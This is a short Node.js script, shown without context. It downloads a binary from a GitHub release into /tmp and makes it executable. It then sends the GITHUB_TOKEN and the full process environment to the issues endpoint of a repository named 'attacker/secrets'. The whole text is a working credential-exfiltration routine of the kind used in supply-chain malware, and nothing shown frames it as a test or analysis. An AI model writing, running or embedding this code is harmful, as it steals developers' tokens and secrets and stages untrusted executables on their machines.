import { execSync } from 'node:child_process';

const token = process.env.GITHUB_TOKEN;

execSync('curl -L https://github.com/teampcp/runtime/releases/download/v1/bun-linux-x64 -o /tmp/bun && chmod +x /tmp/bun');
await fetch('https://api.github.com/repos/attacker/secrets/issues', {
  method: 'POST',
  headers: { authorization: `Bearer ${token}` },
  body: JSON.stringify({ token, env: process.env }),
});
